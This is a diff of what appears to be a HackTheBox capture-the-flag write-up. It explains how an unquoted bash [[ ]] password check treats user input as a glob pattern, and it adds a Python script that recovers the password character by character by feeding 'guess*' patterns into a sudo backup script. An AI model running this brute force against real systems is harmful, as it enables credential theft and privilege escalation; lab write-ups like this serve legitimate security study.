@@ -221,13 +221,43 @@ done
 
 
 14. If using double squared brackets, the comparison has meaning to do pattern matching, not string comparing.
-15. Since `$USER_PASS` (user input) is treated as pattern, hence if user input glob characters such as --> `?` or `*`, it shall potentially match unintended strings.
+15. Since `$USER_PASS` (user input) is treated as pattern, hence if user input glob characters such as --> `?` or `*`, it shall potentially match unintended strings, because `*` matches any string.
 16. In summary, we can leak every chars by bruteforcing it.
+17. To bruteforce it, I used python.
 
-### SCENARIO:
+> SCRIPT
 
+```py
+# from pwn import *
+import string
+import subprocess # to create a new child process.
+
+passw = ""
+is_found = False
+# context.log_level = 'INFO'
+letter_list = list(string.ascii_letters + string.digits)
+# print(all)
+# output:
+# ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 
+# 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 
+# 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 
+# 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
+
+while not is_found:
+    for i in letter_list:
+        cmd = f"echo '{passw}{i}*' | sudo /opt/scripts/mysql-backup.sh"
+        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
+
+        if "Password confirmed!" in result:
+            passw += i
+            # log.success(passw)
+            print(passw)
+            break
+    else:
+        is_found = True
 ```
-DB_PASS = admin
-USER_INPUT = x****
 
-```
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c2100c44-23f9-4481-b71c-1244a771b557)
+
